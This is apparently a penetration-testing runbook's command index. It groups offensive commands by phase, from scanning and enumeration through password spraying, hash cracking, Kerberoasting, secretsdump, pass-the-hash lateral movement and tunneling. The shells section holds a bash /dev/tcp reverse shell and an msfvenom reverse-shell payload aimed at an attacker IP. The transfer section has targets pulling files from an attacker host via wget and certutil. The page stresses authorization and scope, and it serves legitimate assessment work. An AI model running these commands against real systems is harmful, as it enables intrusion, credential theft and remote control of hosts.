---
title: Command Index
description: A fast-access quick reference of the commands used most across the runbook, grouped by assessment phase, each linking to its full page for context and cleanup.
hide:
  - toc
---

# Command Index

The commands you reach for first, grouped by phase. Each block links to the full page for prerequisites, expected output, and cleanup. Replace `<target>`, `<attacker-ip>`, and the credential placeholders before running anything, and confirm scope first.

## Recon and scanning

Full pages: [Network Scanning](network-scanning/network-scanning.md), [Reconnaissance](network-scanning/reconnaissance.md)

```bash
# Fast all-port sweep, then a targeted service and script scan
nmap -p- --min-rate 10000 -T4 <target> -oA nmap/allports
nmap -p<ports> -sCV -oA nmap/targeted <target>

sudo nmap -sU --top-ports 100 <target>        # UDP top ports
nmap -sn -PR 10.10.10.0/24                     # live hosts (ARP beats ICMP internally)
```

## Service enumeration

Full pages: [all service playbooks](information-gathering/index.md), [SMB](information-gathering/service-analysis/smb.md), [LDAP](information-gathering/service-analysis/ldap.md), [Kerberos](information-gathering/service-analysis/kerberos-88.md)

```bash
nxc smb <target> -u '' -p ''                   # SMB null session
nxc smb <target> -u user -p pass --shares
enum4linux-ng -A <target>

ldapsearch -x -H ldap://<target> -b "dc=domain,dc=local"
kerbrute userenum --dc <target> -d domain.local users.txt   # no lockout

snmpwalk -v2c -c public <target>
showmount -e <target>                          # NFS exports
```

## Web and applications

Full pages: [Applications](applications/index.md), [Directory Fuzzing](applications/enumeration/directory-page-fuzzing.md), [SSRF](applications/exploits/ssrf.md), [SQLMap](applications/exploits/sqlmap.md)

```bash
ffuf -w wordlist.txt -u http://<target>/FUZZ
feroxbuster -u http://<target> -w wordlist.txt
gobuster vhost -u http://<target> -w subdomains.txt

whatweb http://<target>
nuclei -u http://<target>
```

## Passwords and hashes

Full page: [Password Cracking](tools/password-cracking.md)

```bash
hashcat -m <mode> hashes.txt rockyou.txt
john --wordlist=rockyou.txt hashes.txt

# Spray one password across a user list. Pull the lockout policy first.
nxc smb <target> -u users.txt -p 'Season2024!' --continue-on-success
```

## Shells and exploitation

Full pages: [Exploitation](exploitation/index.md), [Bind and Reverse Shells](exploitation/shells/bind-reverse-shells.md)

```bash
nc -lvnp <port>                                              # listener
bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'      # reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'              # PTY: then Ctrl+Z; stty raw -echo; fg
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > s.exe
```

## Privilege escalation

Full pages: [Linux](privilege-escalation/linux/index.md), [Windows](privilege-escalation/windows/index.md), [Situational Awareness](privilege-escalation/situational-awareness.md)

```bash
# Linux quick wins
sudo -l
find / -perm -4000 2>/dev/null                 # SUID, cross-reference GTFOBins
./linpeas.sh
```

```powershell
# Windows quick wins
whoami /priv                                    # SeImpersonate points to a Potato attack
.\winPEASx64.exe
```

## Active Directory

Full pages: [Active Directory](privilege-escalation/active-directory/index.md), [BloodHound](tools/bloodhound.md), [Kerberoasting](privilege-escalation/active-directory/kerberoasting.md), [DCSync](privilege-escalation/active-directory/dcsync.md)

```bash
bloodhound-python -u user -p pass -d domain.local -c all -ns <target>

GetNPUsers.py domain.local/ -usersfile users.txt -no-pass    # AS-REP roast
GetUserSPNs.py domain.local/user:pass -request               # Kerberoast
secretsdump.py domain.local/user:pass@<target>               # needs DA or DCSync rights
```

## Lateral movement

Full page: [Lateral Movement](lateral-movement/index.md)

```bash
# Pick the quietest method that works for the target
nxc smb <target> -u user -H <nthash> -x whoami
psexec.py domain.local/user:pass@<target>
wmiexec.py domain.local/user:pass@<target>
evil-winrm -i <target> -u user -p pass
```

## Data transfer and exfil

Full page: [File Transfer Techniques](data-exfiltration/file-transfer-techniques.md)

```bash
python3 -m http.server 8000                                  # attacker serves
wget http://<attacker-ip>:8000/file -O /tmp/file             # Linux target pulls
```

```powershell
certutil -urlcache -split -f http://<attacker-ip>:8000/file C:\Windows\Temp\file   # Windows target pulls
```

## Tunneling

Full pages: [Port Forwarding](port-forwarding/index.md), [Ligolo-ng and Chisel](port-forwarding/ligolo-chisel.md)

```bash
ssh -L 8080:internal:80 user@<target>          # local forward
ssh -D 9050 user@<target>                       # dynamic SOCKS, then proxychains
./agent -connect <attacker-ip>:11601 -ignore-cert   # ligolo-ng agent on target
```

---

This index is a fast path, not a substitute for the full pages. Each command has its prerequisites, expected output, and cleanup notes on its detail page. Confirm authorization and scope before running anything here.
